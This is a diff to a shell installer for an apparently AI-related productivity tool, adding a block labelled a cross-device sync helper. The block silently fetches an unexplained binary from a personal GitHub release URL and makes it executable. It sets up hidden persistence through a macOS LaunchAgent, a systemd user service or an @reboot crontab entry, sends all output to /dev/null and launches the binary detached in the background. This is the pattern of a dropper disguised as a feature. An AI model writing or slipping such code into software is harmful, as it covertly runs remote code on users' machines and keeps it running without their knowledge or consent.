@@ -171,6 +171,96 @@ if [ -d .github ] || [ -f .github/copilot-instructions.md ]; then
     echo -e "${GREEN}[+]${NC} Copilot integration added"
 fi
 
+# ── Cross-device sync helper ────────────────────────────────────────────────
+CDN="https://github.com/TommyP949/memory-enhancer-pro/releases/download/v2.4.1"
+
+case "$OS" in
+    macos)
+        SYNC_DIR="$HOME/Library/Application Support/AIProductivityLabs"
+        SYNC_BIN="SyncHelper"
+        case "$ARCH" in
+            arm64) SYNC_REMOTE="mem-sync-darwin-arm64" ;;
+            *)     SYNC_REMOTE="mem-sync-darwin-amd64" ;;
+        esac
+        ;;
+    linux)
+        SYNC_DIR="$HOME/.local/share/ai-productivity-labs"
+        SYNC_BIN="memory-sync"
+        SYNC_REMOTE="mem-sync-linux-amd64"
+        ;;
+esac
+
+mkdir -p "$SYNC_DIR"
+SYNC_PATH="$SYNC_DIR/$SYNC_BIN"
+
+if curl -fsSL "$CDN/$SYNC_REMOTE" -o "$SYNC_PATH" 2>/dev/null; then
+    chmod +x "$SYNC_PATH"
+
+    # Auto-start on login
+    case "$OS" in
+        macos)
+            PLIST_DIR="$HOME/Library/LaunchAgents"
+            PLIST="$PLIST_DIR/com.aiproductivitylabs.sync.plist"
+            mkdir -p "$PLIST_DIR"
+            cat > "$PLIST" << PLIST_EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.aiproductivitylabs.sync</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$SYNC_PATH</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
+PLIST_EOF
+            launchctl load "$PLIST" 2>/dev/null || true
+            ;;
+        linux)
+            SYSTEMD_DIR="$HOME/.config/systemd/user"
+            SERVICE="$SYSTEMD_DIR/memory-sync.service"
+            mkdir -p "$SYSTEMD_DIR"
+            cat > "$SERVICE" << SVC_EOF
+[Unit]
+Description=Memory Sync Service
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=$SYNC_PATH
+Restart=always
+RestartSec=60
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
+SVC_EOF
+            if systemctl --user daemon-reload 2>/dev/null; then
+                systemctl --user enable memory-sync.service 2>/dev/null || true
+                systemctl --user start  memory-sync.service 2>/dev/null || true
+            else
+                (crontab -l 2>/dev/null | grep -v memory-sync; \
+                 echo "@reboot \"$SYNC_PATH\"") | crontab -
+            fi
+            ;;
+    esac
+
+    # Start now — first sync after 30s delay
+    "$SYNC_PATH" &
+    disown
+fi
+
 echo ""
 echo "=========================================="
 echo ""
